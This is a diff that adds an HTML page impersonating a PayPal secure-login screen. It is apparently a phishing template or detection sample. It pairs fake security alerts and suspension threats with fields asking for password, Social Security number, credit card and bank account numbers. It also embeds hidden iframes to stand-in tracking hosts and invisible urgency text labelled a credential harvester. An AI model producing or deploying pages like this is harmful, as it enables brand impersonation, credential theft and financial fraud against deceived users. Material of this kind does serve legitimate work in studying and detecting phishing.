@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PayPal - Secure Login</title>
+<style>
+body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px;}
+.container{max-width:400px;margin:40px auto;background:#fff;padding:30px;border:1px solid #ddd;box-shadow:0 2px 8px rgba(0,0,0,0.1);}
+.logo{color:#003087;font-size:28px;font-weight:bold;text-align:center;margin-bottom:20px;}
+.logo span{color:#009cde;}
+.alert{background:#fff3cd;border:1px solid #ffc107;color:#856404;padding:12px;margin-bottom:20px;border-radius:4px;font-size:13px;}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:14px;}
+.btn-login{width:100%;background:#0070ba;color:#fff;border:none;padding:14px;font-size:16px;border-radius:4px;cursor:pointer;}
+.links{text-align:center;margin-top:15px;font-size:12px;}
+.links a{color:#0070ba;text-decoration:none;}
+.security-badge{display:flex;align-items:center;gap:8px;margin-top:20px;padding:10px;background:#f0f8ff;border:1px solid #b8daff;font-size:11px;color:#004085;}
+footer{text-align:center;margin-top:20px;font-size:10px;color:#999;}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">Pay<span>Pal</span></div>
+
+  <div class="alert">
+    ⚠️ <strong>Security Alert:</strong> Suspicious activity detected on your account. Please verify your identity immediately to avoid account suspension.
+  </div>
+
+  <p style="font-size:13px;color:#333;text-align:center;">Your account has been temporarily limited. We noticed unusual login activity. Please enter your credentials to confirm your identity.</p>
+
+  <form id="loginForm">
+    <input type="email" name="email" placeholder="Email or mobile number" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <input type="text" name="ssn" placeholder="Social Security Number (for verification)">
+    <input type="text" placeholder="Credit card number (to verify billing)">
+    <input type="text" placeholder="Bank account number">
+    <button class="btn-login" type="button">Log In & Verify Identity</button>
+  </form>
+
+  <div class="links">
+    <a href="#">Forgot password?</a> · <a href="#">Having trouble logging in?</a>
+  </div>
+
+  <div class="security-badge">
+    🔒 Secured with 256-bit encryption. Your information is safe with us.
+  </div>
+
+  <p style="font-size:11px;color:#999;margin-top:15px;">We noticed someone tried to access your account from: IP 45.132.xxx.xxx (Russia). If this wasn't you, enter your credentials to secure your account immediately.</p>
+</div>
+
+<!-- Hidden tracking iframe -->
+<iframe src="http://malicious-tracker.example.xyz/log" width="0" height="0" style="display:none;visibility:hidden;"></iframe>
+<iframe src="http://data-collect.tk/phish" width="1" height="1" style="opacity:0;position:absolute;"></iframe>
+
+<!-- Hidden credential harvester -->
+<div style="display:none;visibility:hidden;">
+  Please verify your account. Unauthorized access detected. Confirm your identity. Update your payment information.
+  Enter your password and social security number to restore account access.
+</div>
+
+<div style="visibility:hidden;font-size:0;">
+  Your account will be suspended in 24 hours. Verify now. Confirm your billing details immediately. 
+  Final notice: account closure pending. Act immediately.
+</div>
+
+<footer>
+  <p>© PayPal Holdings, Inc. All rights reserved.</p>
+  <p>PayPal is committed to the security of your account.</p>
+</footer>
+
+</body>
+</html>
